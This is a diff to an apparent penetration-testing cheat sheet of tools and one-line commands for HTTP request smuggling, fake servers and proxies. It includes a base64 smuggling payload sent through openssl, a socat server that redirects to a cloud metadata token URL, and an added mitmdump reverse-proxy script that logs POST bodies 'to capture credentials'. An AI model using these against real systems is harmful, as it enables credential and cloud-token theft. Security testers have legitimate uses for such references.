@@ -504,6 +504,10 @@ https://github.com/defparam/smuggler
 <br># Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.
 <br>```echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &>/dev/null```
 
+https://github.com/neex/http2smugl
+<br># This tool helps to detect and exploit HTTP request smuggling in cases it can be achieved via HTTP/2 -> HTTP/1.1 conversion by the frontend server.
+<br>```http2smugl detect https://example.com/```
+
 https://github.com/BishopFox/h2csmuggler
 <br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
 <br>```h2csmuggler.py -x https://example.com/ --test```
@@ -774,6 +778,18 @@ https://packettotal.com/
 https://httpbin.org/
 <br># A simple HTTP Request & Response Service.
 
+<br># Reverse Proxy
+<br>```mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/``` # Good for capture credentials
+```
+$ cat script.py
+import mitmproxy.http
+from mitmproxy import ctx
+
+def request(flow):
+    if flow.request.method == "POST":
+        ctx.log.info(flow.request.get_text())
+```
+
 <br># Fake HTTP Server
 <br>```while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done```
 <br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
@@ -791,6 +807,7 @@ https://httpbin.org/
 <br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
 <br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
 <br>```stunnel stunnel.conf``` # Check https://www.stunnel.org/
+
 <br># Python 3 Simple HTTPS Server
 ```
     import http.server, ssl
